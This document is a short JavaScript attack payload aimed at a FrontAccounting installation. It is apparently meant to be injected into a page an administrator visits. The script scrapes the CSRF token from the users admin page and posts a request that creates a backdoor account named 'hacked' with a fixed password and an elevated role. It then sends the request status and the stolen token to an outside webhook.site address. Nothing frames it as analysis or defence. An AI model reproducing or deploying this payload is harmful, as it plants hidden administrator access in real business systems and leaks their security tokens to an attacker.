var r = new XMLHttpRequest();
r.open('GET', '/frontaccounting/admin/users.php', false);
r.send();
var token = (r.responseText.match(/name="_token" value="([^"]+)"/) || [])[1] || '';

var body = 'user_id=hacked&password=hacked123&real_name=hacked' +
           '&phone=&email=&role_id=2&language=C&pos=1' +
           '&print_profile=&rep_popup=1&ADD_ITEM=Add+new' +
           '&_focus=user_id&_modified=0&_confirmed=' +
           '&_token=' + encodeURIComponent(token);

var r2 = new XMLHttpRequest();
r2.open('POST', '/frontaccounting/admin/users.php', false);
r2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
r2.send(body);

new Image().src = 'https://webhook.site/69f1700e-aa89-468d-ad8a-19eba9a9704f/?s=' + r2.status + '&t=' + encodeURIComponent(token);
